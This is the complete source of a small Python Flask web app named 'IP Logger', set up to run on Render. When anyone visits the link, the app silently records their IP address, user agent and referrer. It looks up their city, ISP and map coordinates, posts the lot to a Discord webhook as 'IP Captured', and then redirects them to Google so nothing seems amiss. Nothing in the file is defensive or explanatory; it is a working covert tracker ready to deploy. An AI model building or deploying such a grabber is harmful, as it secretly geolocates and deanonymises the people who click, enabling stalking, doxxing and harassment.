import os
import requests
from datetime import datetime, timezone
from flask import Flask, request, redirect

app = Flask(__name__)

# Set these in Render Environment Variables (not in code)
DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL", "")
REDIRECT_URL = os.getenv("REDIRECT_URL", "https://www.google.com")

def get_ip_info(ip: str) -> dict:
    try:
        r = requests.get(
            f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,lat,lon,timezone,isp,org,mobile,proxy,hosting,query",
            timeout=5,
        )
        data = r.json()
        if data.get("status") == "success":
            return data
    except Exception:
        pass
    return {"query": ip, "country": "Unknown", "city": "Unknown", "regionName": "Unknown",
            "isp": "Unknown", "org": "Unknown", "timezone": "Unknown",
            "lat": None, "lon": None, "mobile": False, "proxy": False, "hosting": False}

def send_to_discord(ip_info: dict, ua: str, referer: str):
    if not DISCORD_WEBHOOK_URL:
        print("[!] DISCORD_WEBHOOK_URL not set")
        return

    ip = ip_info.get("query", "Unknown")
    city = ip_info.get("city", "Unknown")
    region = ip_info.get("regionName", "Unknown")
    country = ip_info.get("country", "Unknown")
    isp = ip_info.get("isp", "Unknown")
    org = ip_info.get("org", "Unknown")
    tz = ip_info.get("timezone", "Unknown")
    lat = ip_info.get("lat")
    lon = ip_info.get("lon")
    mobile = ip_info.get("mobile", False)
    proxy = ip_info.get("proxy", False)
    hosting = ip_info.get("hosting", False)

    location = ", ".join([p for p in [city, region, country] if p and p != "Unknown"]) or "Unknown"

    flags = []
    if proxy:
        flags.append("Proxy/VPN")
    if hosting:
        flags.append("Datacenter")
    if mobile:
        flags.append("Mobile")
    flags_text = " | ".join(flags) if flags else "None"

    maps = f"[Open Maps](https://www.google.com/maps?q={lat},{lon})" if lat and lon else "N/A"

    # Color: red normal, orange if proxy/hosting
    color = 0xFFA500 if (proxy or hosting) else 0xFF0000

    payload = {
        "username": "IP Logger",
        "embeds": [{
            "title": "IP Captured",
            "color": color,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "fields": [
                {"name": "IP Address", "value": f"`{ip}`", "inline": False},
                {"name": "Location", "value": location, "inline": True},
                {"name": "Maps", "value": maps, "inline": True},
                {"name": "ISP", "value": isp or "Unknown", "inline": True},
                {"name": "Org", "value": org or "Unknown", "inline": True},
                {"name": "Timezone", "value": tz or "Unknown", "inline": True},
                {"name": "Flags", "value": flags_text, "inline": False},
                {"name": "User-Agent", "value": f"`{(ua or 'Unknown')[:150]}`", "inline": False},
                {"name": "Referer", "value": f"`{(referer or 'None')[:150]}`", "inline": False},
            ],
        }],
    }

    try:
        r = requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=10)
        print(f"[+] Discord status: {r.status_code}")
    except Exception as e:
        print(f"[!] Discord error: {e}")

@app.route("/")
def index():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()

    ua = request.headers.get("User-Agent", "Unknown")
    referer = request.headers.get("Referer", "")

    ip_info = get_ip_info(ip)
    send_to_discord(ip_info, ua, referer)

    return redirect(REDIRECT_URL)

@app.route("/ping")
def ping():
    return "pong", 200

if __name__ == "__main__":
    port = int(os.getenv("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
